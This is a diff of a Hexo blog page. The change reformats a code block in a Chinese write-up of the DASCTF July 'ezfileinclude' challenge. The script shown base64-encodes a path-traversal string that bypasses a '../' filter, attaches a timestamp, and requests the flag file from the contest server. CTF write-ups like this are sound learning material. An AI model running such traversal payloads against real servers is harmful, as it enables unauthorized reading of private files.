@@ -63,7 +63,7 @@
     <script src="/js/util.js"></script>
     <script src="/js/main.js"></script>
 	
-<meta name="generator" content="Hexo 4.2.1"></head>
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
     
 		
 <!-- Layouts -->
@@ -159,9 +159,16 @@
                 <h1 id="DASCTF七月赛"><a href="#DASCTF七月赛" class="headerlink" title="DASCTF七月赛"></a>DASCTF七月赛</h1><h2 id="ezfileinclude"><a href="#ezfileinclude" class="headerlink" title="ezfileinclude"></a>ezfileinclude</h2><p>这题当时我被卡在time那里，傻了。</p>
 <p>实际上直接用python的time.time()就行了，但我忘了，一直在考虑用反应头age。</p>
 <p>f=要base64加密一下，目录穿越读flag，但发现../被过滤，url绕过也不行，甚至读不出image.php，思考一番，应该是只能读jpg文件，所以在gpy.jpg后面加上../就行了，payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import time,requests,base64</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;183.129.189.60:10009&#x2F;image.php?t&#x3D;&#39;</span><br><span class="line">url2 &#x3D; &#39;&amp;f&#x3D;&#39;</span><br><span class="line"></span><br><span class="line">aim &#x3D; b&#39;gqy.jpg..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag&#39;</span><br><span class="line">aim &#x3D; str(base64.b64encode(aim), encoding&#x3D;&#39;utf-8&#39;)</span><br><span class="line">r &#x3D; requests.get(url + str(int(time.time())) + url2 + aim)</span><br><span class="line"> </span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<pre><code>import time,requests,base64
 
-<p>这里看到大佬的payload顺便学习了一下python字符串前加b’gqy.jpg../../../../../../flag’的意义，这里我觉得不加也无所谓。</p>
+url = &#39;http://183.129.189.60:10009/image.php?t=&#39;
+url2 = &#39;&amp;f=&#39;
+
+aim = b&#39;gqy.jpg../../../../../../flag&#39;
+aim = str(base64.b64encode(aim), encoding=&#39;utf-8&#39;)
+r = requests.get(url + str(int(time.time())) + url2 + aim)
+
+print(r.text)</code></pre><p>这里看到大佬的payload顺便学习了一下python字符串前加b’gqy.jpg../../../../../../flag’的意义，这里我觉得不加也无所谓。</p>
 <blockquote>
 <h4 id="1、字符串前加-u"><a href="#1、字符串前加-u" class="headerlink" title="1、字符串前加 u"></a>1、字符串前加 u</h4><p>例：u”我是含有中文字符组成的字符串。”</p>
 <p>作用：</p>
